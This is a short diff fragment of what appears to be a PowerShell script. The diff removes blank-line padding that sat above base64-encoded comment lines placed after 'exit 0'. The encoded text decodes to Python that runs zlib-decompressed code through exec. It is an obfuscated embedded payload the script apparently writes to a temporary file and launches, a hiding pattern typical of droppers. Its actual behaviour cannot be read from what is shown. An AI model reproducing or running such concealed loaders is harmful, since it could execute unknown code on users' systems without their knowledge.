@@ -40,30 +40,6 @@ Remove-Item $tmpPy -Force
 if ($code -ne 0) { Die "запуск не удался" }
 exit 0
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #__P__
 #@IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojY29kaW5nOmNwNDM3CmltcG9ydCB6bGliO2V4ZWMoemxp
 #@Yi5kZWNvbXByZXNzKCJ42o1Xe1fbOhL/359Cy4XK3jh2QoFL06W7bggt3Fx4MDBdSp8hN0exldjF
